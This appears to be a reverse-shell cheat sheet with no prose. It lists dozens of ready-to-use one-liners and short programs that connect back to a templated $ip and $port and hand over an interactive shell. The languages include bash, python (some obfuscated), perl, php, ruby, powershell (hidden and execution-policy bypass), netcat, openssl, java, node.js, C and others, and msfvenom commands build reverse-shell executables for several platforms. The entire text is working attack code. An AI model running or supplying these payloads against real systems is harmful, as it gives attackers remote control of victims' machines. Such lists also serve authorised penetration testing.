```bash
bash -i >& /dev/tcp/$ip/$port 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196
```

```bash
/bin/bash -l > /dev/tcp/$ip/$port 0<&1 2>&1
```

```bash
bash -i >& /dev/tcp/$ip/$port 0>&1
```

```zsh
zsh -i >& /dev/tcp/$ip/$port 0>&1
```

```ash
ash -i >& /dev/tcp/$ip/$port 0>&1
```

```bsh
bsh -i >& /dev/tcp/$ip/$port 0>&1
```

```csh
csh -i >& /dev/tcp/$ip/$port 0>&1
```

```ksh
ksh -i >& /dev/tcp/$ip/$port 0>&1
```

```sh
sh -i >& /dev/udp/$ip/$port 0>&1
```

```bash
bash -i >& /dev/udp/$ip/$port 0>&1
```

```zsh
zsh -i >& /dev/udp/$ip/$port 0>&1
```

```ash
ash -i >& /dev/udp/$ip/$port 0>&1
```

```bsh
bsh -i >& /dev/udp/$ip/$port 0>&1
```

```csh
csh -i >& /dev/udp/$ip/$port 0>&1
```

```ksh
ksh -i >& /dev/udp/$ip/$port 0>&1
```

```socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
```

```perl
perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```python
export RHOST="$ip";export RPORT=$port;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("$ip",$port));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("$ip",$port));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("$ip",$port));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("$ip",$port));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("$ip",$port));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("$ip",$port));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("$ip",$port,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("$ip",$port,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("$ip",$port,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$ip', $port)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

```php
php -r '$sock=fsockopen("$ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("$ip",$port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("$ip",$port);`/bin/sh -i <&3 >&3 2>&3`;'
```

```php
php -r '$sock=fsockopen("$ip",$port);system("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("$ip",$port);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("$ip",$port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```php
php -r '$sock=fsockopen("$ip",$port);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

```ruby
ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("$ip","$port");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

```ruby
ruby -rsocket -e 'c=TCPSocket.new("$ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$ip:$port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

```nc
nc -e /bin/sh $ip $port
```

```nc
nc -e /bin/bash $ip $port
```

```nc
nc -c bash $ip $port
```

```nc
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
```

```nc
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
```

```ncat
ncat $ip $port -e /bin/bash
```

```ncat
ncat --udp $ip $port -e /bin/bash
```

```openssl
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip:$port > /tmp/s; rm /tmp/s
```

```openssl
export RHOST="$ip"; export RPORT="$port"; export PSK="replacewithgeneratedpsk"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```awk
awk 'BEGIN {s = "/inet/tcp/0/$ip/$port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

```java
String host="$ip";
int port=$port;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```telnet
telnet $ip $port | /bin/sh | telnet $ip 8081
```

```war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > reverse.war | strings reverse.war | grep jsp # in order to get the name of the file
```

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

```lua
lua5.1 -e 'local host, port = "$ip", $port local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect($port, "$ip", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

```javascript
require('child_process').exec('nc -e /bin/sh $ip $port')
```

```javascript
-var x = global.process.mainModule.require
-x('child_process').exec('nc $ip $port -e /bin/bash')
```

```java
String host="$ip";
int port=$port;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```csharp
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $port;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("$ip");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```

```java
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("$ip", $port).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```

```elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST="$ip" LPORT=$port -f elf > shell.elf
```

```elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$ip" LPORT=$port -f elf > shell.elf
```

```asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST="$ip" LPORT=$port -f asp > shell.asp
```

```asp
msfvenom -p windows/x86/shell_reverse_tcp LHOST="$ip" LPORT=$port -f asp > shell.asp
```

```jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$ip" LPORT=$port -f raw > shell.jsp
```

```exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST="10.0.0.1" LPORT=$port -f exe > shell.exe
```

```exe
msfvenom -p windows/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=$port -f exe > shell.exe
```

```macho
msfvenom -p osx/x86/shell_reverse_tcp LHOST="$ip" LPORT=$port -f macho > shell.macho
```

```macho
msfvenom -p osx/x64/shell_reverse_tcp LHOST="$ip" LPORT=$port -f macho > shell.macho
```
